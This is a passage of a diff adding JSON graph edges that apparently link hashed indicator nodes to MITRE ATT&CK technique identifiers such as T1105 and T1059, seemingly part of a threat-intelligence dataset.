+      "node_u": "HL_3d1a1935522e",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_12",
+      "node_u": "HL_3d1a1935522e",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_13",
+      "node_u": "HL_3d1a1935522e",
+      "node_v": "TTP_T1140"
+    },
+    {
+      "edge_id": "EDGE_14",
+      "node_u": "HL_44b3459204b4",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_15",
+      "node_u": "HL_688fb538c905",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_16",
+      "node_u": "HL_80a0b844d4da",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_17",
+      "node_u": "HL_80a0b844d4da",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_18",
+      "node_u": "HL_80a0b844d4da",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_19",
+      "node_u": "HL_80a0b844d4da",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_20",
+      "node_u": "HL_80a0b844d4da",
+      "node_v": "TTP_T1189"
+    },
+    {
+      "edge_id": "EDGE_21",
+      "node_u": "HL_80a0b844d4da",
+      "node_v": "TTP_T1204"
+    },
+    {
+      "edge_id": "EDGE_22",
+      "node_u": "HL_90efe23aaf5d",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_23",
+      "node_u": "HL_90efe23aaf5d",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_24",
+      "node_u": "HL_9b4374c69d53",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_25",
+      "node_u": "HL_9b4374c69d53",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_26",
+      "node_u": "HL_cb9d03e625e4",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_27",
+      "node_u": "HL_cb9d03e625e4",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_28",
+      "node_u": "HL_cb9d03e625e4",
+      "node_v": "TTP_T1204"
+    },
+    {
+      "edge_id": "EDGE_29",
+      "node_u": "HL_cd672110fb8d",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_30",
+      "node_u": "HL_cd672110fb8d",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_31",
+      "node_u": "IOC_8996a777ce0e",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_32",
+      "node_u": "IOC_8996a777ce0e",
+      "node_v": "TTP_T1105"
+    }
+  ]
+}
